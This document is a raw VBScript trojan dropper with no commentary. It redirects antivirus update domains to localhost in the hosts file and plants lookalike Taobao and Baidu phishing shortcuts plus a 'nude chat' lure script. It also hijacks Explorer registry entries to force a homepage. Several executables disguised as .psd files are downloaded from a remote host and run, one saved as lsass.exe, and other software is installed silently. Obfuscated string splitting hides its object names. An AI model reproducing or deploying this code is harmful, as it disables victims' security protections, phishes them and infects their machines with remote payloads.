On Error Resume Next
downname1=StrReverse(Mid(StrReverse(wscript.ScriptName),5))
Set fso=CreateObject("Scripting.FileSystemObject")
Set goto10 = WScript.CreateObject("WScript.Shell")
SYSTEMROOT=goto10.Environment("process")("APPDATA")
set wsssr3=createobject("wsc"&"ri"&"pt.sh"&"ell")
strDesktop = wsssr3.SpecialFolders("Desktop")
strWinDir=wsssr3.ExpandEnvironmentStrings("%te"&"mp%")
Set system32=fso.GetSpecialFolder(1)
Set xfuck = CreateObject("M"&"icrosoft.XMLHT"&"T"&"P")
top=wsssr3.SpecialFolders("desktop")
user_start=wsssr3.specialfolders("startup") & "\"
cpan=goto10.ExpandEnvironmentStrings("%WinDir%")
set ws11=createobject("wscript.shell")
strDesktop = goto10.SpecialFolders("Desktop") 
Randomize
go_num = Int((999999* Rnd) + 100)
win=fso.getspecialfolder(0)
Set c_sys= fso.GetSpecialFolder(1)
fso.GetFile(""&c_sys&"\drivers\etc\hosts").Attributes =4
Set file=fso.OpenTextFile(""&c_sys&"\drivers\etc\hosts",8,True)
file.WriteLine(""&Chr(13)&""&Chr(10)&"127.0.0.1 dl.360safe.com")
file.WriteLine("127.0.0.1 update.360safe.com")
file.WriteLine("127.0.0.1 updateh.360safe.com")
file.WriteLine("127.0.0.1 sdupm.360.cn")
file.WriteLine("127.0.0.1 sdup.360.cn")
file.WriteLine("127.0.0.1 f.360.cn")
file.WriteLine("127.0.0.1 conf.f.360.cn")
file.WriteLine("127.0.0.1 qup.f.360.cn")
file.WriteLine("127.0.0.1 up.f.360.cn")
file.WriteLine("127.0.0.1 s.qup.f.360.cn")
file.WriteLine("127.0.0.1 h.qup.f.360.cn")
file.WriteLine("127.0.0.1 www.360.cn")
file.WriteLine("127.0.0.1 www.rising.com.cn")
file.WriteLine("127.0.0.1 rsup10.rising.com.cn")
file.WriteLine("127.0.0.1 rsdownload.rising.com.cn")
file.WriteLine("127.0.0.1 rsdownauto.rising.com.cn")
file.WriteLine("127.0.0.1 cloudinfo.rising.com.cn")
file.WriteLine("127.0.0.1 go.rising.com.cn")
file.WriteLine("127.0.0.1 www.duba.net")
file.WriteLine("127.0.0.1 www.jiangmin.com")
file.WriteLine("127.0.0.1 89.202.149.36")
file.Close
set file=Nothing
Set txtFile=fso.CreateTextFile(""&strDesktop&"\淘宝网.url",True)
txtFile.WriteLine "[InternetShortcut]"
txtFile.WriteLine "URL=http://www.7400.net/taobao/"
txtFile.WriteLine "IDList="
txtFile.WriteLine "IconFile=http://www.taobao.com/favicon.ico"
txtFile.WriteLine "IconIndex=1"
txtFile.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
txtFile.WriteLine "Prop3=19,2"
txtFile.Close
set txtFile=Nothing
Set txtFile=fso.CreateTextFile(""&strDesktop&"\百度搜索.url",True)
txtFile.WriteLine "[InternetShortcut]"
txtFile.WriteLine "URL=http://www.googje.in/baidu/"
txtFile.WriteLine "IDList="
txtFile.WriteLine "IconFile=http://www.baidu.com/favicon.ico"
txtFile.WriteLine "IconIndex=1"
txtFile.WriteLine "[{000214A0-0000-0000-C000-000000000046}]"
txtFile.WriteLine "Prop3=19,2"
txtFile.Close
set txtFile=Nothing
Set txtFile=fso.CreateTextFile(""&system32&"\mm.vbs",True)
txtFile.WriteLine "msgbox ""重要提醒:大厅版本已经升级,请您重新下载最新版本安装,立刻进行激情裸聊."""
txtFile.WriteLine "Set obj_"&go_num&" = CreateObject(""Wscript.Shell"")"
txtFile.WriteLine "obj_"&go_num&".Run(""http://204.188.209.194/mm.html"")"
txtFile.Close
set txtFile=Nothing
set oShellLink = goto10.CreateShortcut(""&strDesktop&"\裸聊大厅.lnk")
oShellLink.TargetPath = ""&system32&"\mm.vbs"
oShellLink.IconLocation = ""&system32&"\shell32.dll,150" 
oShellLink.Save
'------------------------------------------------------------------------------------
Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapt"&"erConfiguration")
For Each mo In mc
If mo.IPEnabled=True Then
nums1=mo.MacAddress
nums1=replace(nums1,":","")
Exit For
End If
Next
nums_len=Len(nums1)
For i=1 To nums_len
tmp1=Mid(nums1,i,1)
If IsNumeric(tmp1) Then
tmp1=tmp1 * 16 * (16^(nums_len-i-1))
Else
tmp1=(ASC(UCase(tmp1))-55) * (16^(nums_len-i))
End If
tmpstr=tmpstr+tmp1
Next
Randomize tmpstr
reg_4=Int((9999-1000+1)*Rnd()+1000)
reg_8_=Int((99999999-10000000+1)*Rnd()+10000000)
reg_12=Int((999999999999-100000000000+1)*Rnd()+100000000000)
reg_5=left(reg_12,4)
reg_6=left(reg_8_,4)
reggg=""&reg_8_&"-"&reg_5&"-"&reg_4&"-"&reg_6&"-"&reg_12&""
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shellex\ContextMenuHandlers\ieframe\","{"&reggg&"}","REG_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shellex\ContextMenuHandlers\IE\","{"&reggg&"}","REG_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reggg&"}\InProcServer32\","%SystemRoot%\system32\shdocvw.dll","REG_EXPAND_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reggg&"}\InProcServer32\ThreadingModel","Apartment","REG_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reggg&"}\shellex\MayChangeDefaultMenu\","","REG_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reggg&"}\Instance\CLSID","{3f454f0e-42ae-4d7c-8ea3-328250d6e272}","REG_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reggg&"}\Instance\InitPropertyBag\CLSID","{13709620-C279-11CE-A49E-444553540000}","REG_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reggg&"}\Instance\InitPropertyBag\command","打开主页","REG_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reggg&"}\Instance\InitPropertyBag\method","ShellExecute","REG_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reggg&"}\Instance\InitPropertyBag\Param1","http://%77%77%77%2e%37%34%30%30%2e%6e%65%74","REG_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{"&reggg&"}\Instance\InitPropertyBag\Param2","%ProgramFiles%\Internet Explorer\iexplore.exe","REG_EXPAND_SZ"
goto10.RegWrite "HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\ShellFolder\Attributes",a,"REG_DWORD" 'IE删除键
goto10.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktopCleanupWizard",1,"REG_DWORD" '桌面清理
goto10.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoInternetIcon",0,"REG_DWORD" '桌面IE
'------------------------------------------------------------------------------------
with xfuck
.Open "GET","http://d.360360.co.cc/down/a.psd",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y") 
.SaveToFile ""&strWinDir&"\"&downname1&".exe",eval ("2")
end with
ws11.run """"&strWinDir&"\"&downname1&".exe"""
with xfuck
.Open "GET","http://d.360360.co.cc/down/lsass.psd",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y") 
.SaveToFile ""&systemroot&"\lsass.exe",eval ("2")
end with
ws11.run """"&systemroot&"\lsass.exe"""
with xfuck
.Open "GET","http://d.360360.co.cc/down/dz.psd",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y") 
.SaveToFile ""&strDesktop&"\免费看电影.exe",eval ("2")
end with
ws11.run """"&strDesktop&"\免费看电影.exe"""
with xfuck
.Open "GET","http://d.360360.co.cc/down/k.psd",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y") 
.SaveToFile ""&strWinDir&"\k.exe",eval ("2")
end with
ws11.run ""&strWinDir&"\k.exe"
with xfuck 
.Open "GET","http://neirong.funshion.com/software/download.php?id=43423",False
.Send() 
end with
Set szy = CreateObject("A"&"DODB.S"&"tr"&"eam") 
with szy  
.type = eval("1")
.Mode = eval("3")
.open()
.write eval("xfuc"&"k.res"&"ponse"&"Bod"&"y")
.SaveToFile ""&strWinDir&"\FunshionInstall_C43423.exe",eval ("2")
end with
ws11.run ""&strWinDir&"\FunshionInstall_C43423.exe /S"
WScript.Sleep 3000
FSO.DeleteFolder(""&goto10.SpecialFolders("AllUsersPrograms")&"\风行")